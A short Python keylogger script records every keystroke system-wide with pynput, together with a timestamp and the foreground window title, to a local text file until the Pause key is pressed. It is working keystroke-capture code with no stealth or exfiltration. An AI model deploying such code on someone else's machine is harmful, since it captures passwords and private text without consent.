from pynput import keyboard, mouse
from win32 import win32gui
from win32gui import GetWindowText, GetForegroundWindow

import datetime

def on_press(key):
    try:
        k = key.char
    except:
        k = key.name
    if k == "pause":
        return False
    else:
        f = open("D:\Programming\keyLog.txt", "a")
        x = datetime.datetime.now()
        try:
            str = x.strftime("%Y-%m-%d %H:%M:%S") + ":\t " + GetWindowText(GetForegroundWindow()).split(" - ")[len(GetWindowText(GetForegroundWindow()).split(" - ")) - 1]+ ":\t " + k + "\n"
            f.write(str.encode('ascii', 'ignore').decode('ascii'))
        except:
            pass
        f.close()
    
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
